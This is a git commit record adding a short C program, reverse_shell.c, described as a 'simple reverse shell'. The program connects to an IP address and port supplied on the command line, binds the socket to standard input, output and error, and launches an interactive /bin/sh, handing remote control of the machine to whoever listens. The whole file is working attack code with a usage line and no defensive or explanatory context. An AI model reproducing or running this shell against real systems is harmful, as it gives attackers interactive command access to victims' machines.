e12c753b4ecbaa40f9a98be50a18f3ad270af7e7
Victor Ramos Mello <victornrm@gmail.com>
2013-04-09 01:28:50 -0300

    simple reverse shell

---
+++ reverse_shell.c
@@ -0,0 +1,41 @@
+/*
+simple reverseshell by m0nad
+*/
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
+#include <arpa/inet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int
+main(int argc, char ** argv)
+{
+  int sock, conex;
+  struct sockaddr_in target;
+  char * const sh[] = {"/bin/sh", "-i", NULL};
+
+  if (argc < 3) 
+    printf("usage:\t%s <ip> <port>\n", argv[0]), exit(1);
+
+  target.sin_family = AF_INET;
+  target.sin_port   = htons(atoi(argv[2]));
+  target.sin_addr.s_addr = inet_addr(argv[1]);
+  
+  sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+  if (sock < 0)
+    perror("socket"), exit(1);
+
+  conex = connect(sock, (struct sockaddr *)&target, sizeof(struct sockaddr));
+  if (conex < 0)
+    perror("connect"), exit(1);
+
+  dup2(sock, 0);
+  dup2(sock, 1);
+  dup2(sock, 2);
+
+  execve(*sh, sh, NULL);
+
+  return 0;
+}
